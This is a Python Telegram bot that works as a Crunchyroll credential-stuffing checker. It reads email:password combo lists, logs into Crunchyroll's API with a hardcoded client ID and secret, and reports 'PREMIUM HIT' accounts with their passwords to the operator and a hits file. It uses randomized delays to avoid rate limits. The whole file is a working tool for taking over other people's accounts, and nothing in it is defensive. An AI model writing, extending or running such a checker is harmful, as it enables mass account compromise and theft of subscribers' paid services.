import os
import asyncio
import uuid
import random
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")
AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}


class CrunchyrollChecker:
    def __init__(self):
        self.countries = {
            "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "BR": "Brazil 🇧🇷",
            "IN": "India 🇮🇳", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷", "JP": "Japan 🇯🇵"
            # You can add more countries from your original code if you want
        }

    def check(self, email, password):
        try:
            device_id = str(uuid.uuid4())
            session = requests.Session()

            # Login - exact from your original
            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': device_id,
                'device_name': 'Baron'
            }

            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, timeout=15)

            if r.status_code != 200 or '"access_token"' not in r.text:
                return {'status': 'INVALID', 'email': email}

            token = r.json().get('access_token')
            headers = {'authorization': f'Bearer {token}', 'user-agent': 'AppleCoreMedia/1.0.0.20L563'}

            me = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=10).json()
            external_id = me.get('external_id')

            sub = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=10).json()

            is_premium = sub.get('is_active', False) and not sub.get('is_cancelled', False)

            return {
                'status': 'PREMIUM' if is_premium else 'FREE',
                'email': email,
                'password': password,
                'email_verified': me.get('email_verified', False),
                'expiry': str(sub.get('next_renewal_date', 'N/A'))[:10],
                'country': sub.get('country_code', 'Unknown'),
                'plan': sub.get('tier', 'Unknown')
            }
        except:
            return {'status': 'ERROR', 'email': email}


async def send_result(chat_id, result):
    if result['status'] == 'PREMIUM':
        text = f"""🎯 <b>PREMIUM HIT</b>
<pre>
Email     : {result['email']}
Password  : {result['password']}
Expiry    : {result.get('expiry', 'N/A')}
Country   : {result.get('country', 'N/A')}
Verified  : {result.get('email_verified', 'N/A')}
Plan      : {result.get('plan', 'N/A')}
</pre>"""
        await bot.send_message(chat_id, text, parse_mode="HTML")
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"PREMIUM | {result['email']}:{result['password']} | {result.get('expiry')}\n")
    elif result['status'] == 'FREE':
        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
    else:
        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")


@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer(
        "✅ Bot is ready.\n\n"
        "⚠️ Important:\n"
        "• Since you are not using proxies, check **only 1–3 combos at a time**.\n"
        "• Wait 10+ seconds between batches.\n"
        "• Single checks work best."
    )


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    global checker

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text.replace("/check", "").strip()

    lines = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]

    if not lines:
        return await message.answer("No valid combos found.")

    await message.answer(f"🚀 Starting check on {len(lines)} combos... (very slow - no proxies)")

    for line in lines:
        try:
            email, password = line.split(":", 1)
            result = checker.check(email.strip(), password.strip())

            stats['checked'] += 1
            if result['status'] == 'PREMIUM':
                stats['premium'] += 1
            elif result['status'] == 'FREE':
                stats['free'] += 1
            else:
                stats['invalid'] += 1

            await send_result(message.from_user.id, result)

            # Very long delay because no proxies
            await asyncio.sleep(7.0 + random.uniform(1.0, 3.0))

        except:
            continue


async def main():
    global checker
    checker = CrunchyrollChecker()
    print("✅ Bot started (no proxies mode)")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
